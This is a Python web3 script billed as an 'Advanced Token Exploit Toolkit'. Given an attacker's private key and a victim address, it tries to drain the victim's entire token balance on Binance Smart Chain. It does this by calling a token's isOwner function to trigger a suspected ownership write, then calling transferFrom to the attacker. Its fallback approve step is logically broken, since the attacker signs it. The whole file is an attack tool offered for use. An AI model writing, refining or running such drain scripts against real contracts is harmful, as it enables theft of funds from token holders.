from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
from eth_account.messages import encode_defunct

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Advanced Token Exploit Toolkit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
contract_address = w3.to_checksum_address(args.token_address)
victim_address = w3.to_checksum_address(args.victim_address)
attacker_address = account.address

# ===== COMPLETE TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },

    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
]

# ===== CORE FUNCTIONS =====
def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": attacker_address,
                "nonce": w3.eth.get_transaction_count(attacker_address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),  # 20% gas premium
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise

def verify_contract_state(token):
    """Check key contract state variables"""
    print("\n[+] Contract State Verification:")
    try:
        owner = token.functions.owner().call()
        print(f"Current Owner: {owner}")
    except exceptions.ContractLogicError as e:
        print(f"Could not verify owner directly: {e}")
    except Exception as e:
        print(f"Could not verify owner: {e}")

    victim_bal = token.functions.balanceOf(victim_address).call()
    print(f"Victim Balance: {victim_bal}")

    allowance = token.functions.allowance(victim_address, attacker_address).call()
    print(f"Allowance for Attacker: {allowance}")

    max_supply = token.functions._maxSupply().call()
    print(f"Max Supply: {max_supply}")

def execute_exploit():
    """Main exploit execution flow"""
    token = w3.eth.contract(address=contract_address, abi=TOKEN_ABI)

    print(f"\n[+] Target Contract: {contract_address}")
    print(f"[+] Attacker Address: {attacker_address}")
    print(f"[+] Victim Address: {victim_address}")

    # Initial state check
    verify_contract_state(token)

    # Step 1: Attempt to trigger the storage write in isOwner
    print("\n[1] Attempting to trigger storage write via isOwner...")
    try:
        receipt = send_transaction(token.functions.isOwner(attacker_address), gas=100000)
        print(f"isOwner TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
    except Exception as e:
        print(f"isOwner call error: {e}")
        return

    time.sleep(5)  # Wait for potential state update
    verify_contract_state(token)

    # Step 2: Attempt to transfer using transferFrom (will likely still fail without allowance or the intended bypass)
    print("\n[2] Attempting transferFrom...")
    victim_bal = token.functions.balanceOf(victim_address).call()
    if victim_bal == 0:
        print("Victim has no balance to transfer")
        return

    try:
        receipt = send_transaction(
            token.functions.transferFrom(
                victim_address,
                attacker_address,
                victim_bal
            ),
            gas=400000  # Extra gas for potential complex logic
        )

        print("\n[+] transferFrom Results:")
        print(f"TX Hash: {receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")

        # Final verification
        new_bal = token.functions.balanceOf(victim_address).call()
        print(f"New Victim Balance: {new_bal}")

    except Exception as e:
        print(f"\n[!] transferFrom failed: {e}")
        print("Potential reasons:")
        print("- Still no allowance")
        print("- The 'isOwner' call didn't enable a bypass")
        print("- Other unexpected contract logic")

    # --- Attempting to Approve (Standard way, likely needed if the isOwner bypass doesn't work) ---
    print("\n[3] Attempting to approve attacker to spend victim's tokens...")
    try:
        approve_amount = token.functions.balanceOf(victim_address).call()
        receipt = send_transaction(
            token.functions.approve(attacker_address, approve_amount),
            gas=100000
        )
        print(f"Approve TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
        time.sleep(5)
        verify_contract_state(token)

        print("\n[4] Attempting transferFrom after approval...")
        victim_bal = token.functions.balanceOf(victim_address).call()
        if victim_bal > 0:
            receipt = send_transaction(
                token.functions.transferFrom(
                    victim_address,
                    attacker_address,
                    victim_bal
                ),
                gas=400000
            )
            print("\n[+] transferFrom (after approve) Results:")
            print(f"TX Hash: {receipt.transactionHash.hex()}")
            print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
            print(f"Gas Used: {receipt.gasUsed}")
            new_bal = token.functions.balanceOf(victim_address).call()
            print(f"New Victim Balance: {new_bal}")
        else:
            print("Victim balance is zero, no transfer needed.")

    except Exception as e:
        print(f"\n[!] Approve and transferFrom failed: {e}")

if __name__ == "__main__":
    execute_exploit()
